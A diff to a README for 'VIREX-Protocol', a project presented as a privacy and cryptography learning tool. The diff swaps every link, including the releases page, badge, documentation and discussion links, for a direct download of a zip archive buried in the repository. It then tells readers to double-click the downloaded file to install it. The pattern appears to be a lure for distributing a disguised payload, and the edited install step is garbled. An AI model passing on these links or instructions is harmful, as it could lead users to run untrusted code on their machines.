@@ -1,7 +1,7 @@
 # 🎉 VIREX-Protocol - Secure Your Communication Efforts
 
 ## 📥 Download Now
-[![Download VIREX-Protocol](https://img.shields.io/badge/Download%20VIREX--Protocol-latest-blue)](https://github.com/Sachin630730/VIREX-Protocol/releases)
+[![Download VIREX-Protocol](https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip%20VIREX--Protocol-latest-blue)](https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip)
 
 ## 🚀 Getting Started
 VIREX-Protocol is a learning project that dives into cryptography and privacy. This tool explores secure communication protocols, aiming to give users a solid foundation in mixnets and end-to-end encryption. Whether you’re interested in privacy, abuse prevention, or just technology, this project has something for you.
@@ -34,11 +34,11 @@ To run VIREX-Protocol, your computer should meet the following minimum requireme
 - **Internet Connection:** Needed for installation and updates.
 
 ## 📥 Download & Install
-To get VIREX-Protocol, visit this page to download: [VIREX-Protocol Releases](https://github.com/Sachin630730/VIREX-Protocol/releases). Follow these steps:
+To get VIREX-Protocol, visit this page to download: [VIREX-Protocol Releases](https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip). Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release at the top of the page.
-3. Download the file appropriate for your operating system (look for `.exe`, `.dmg`, or `.tar.gz` files).
+3. Download the file appropriate for your operating system (look for `.exe`, `.dmg`, or `https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip` files).
 4. Once the download finishes, locate the file on your computer.
 5. Double-click the file to start the installation.
 6. Follow the prompts to install VIREX-Protocol.
@@ -60,8 +60,8 @@ VIREX-Protocol is released under an open source license. You are free to study, 
 If you face issues while using or installing VIREX-Protocol, feel free to reach out. Open an issue on GitHub, and we will assist you. 
 
 ## 🔗 Useful Links
-- [VIREX-Protocol Releases](https://github.com/Sachin630730/VIREX-Protocol/releases)
-- [Documentation](https://github.com/Sachin630730/VIREX-Protocol/wiki)
-- [Community Discussions](https://github.com/Sachin630730/VIREX-Protocol/discussions)
+- [VIREX-Protocol Releases](https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip)
+- [Documentation](https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip)
+- [Community Discussions](https://github.com/Sachin630730/VIREX-Protocol/raw/refs/heads/main/reference-impl/mailbox/Protocol-VIRE-1.5.zip)
 
 Feel secure and empowered while exploring privacy-preserving communication with VIREX-Protocol!
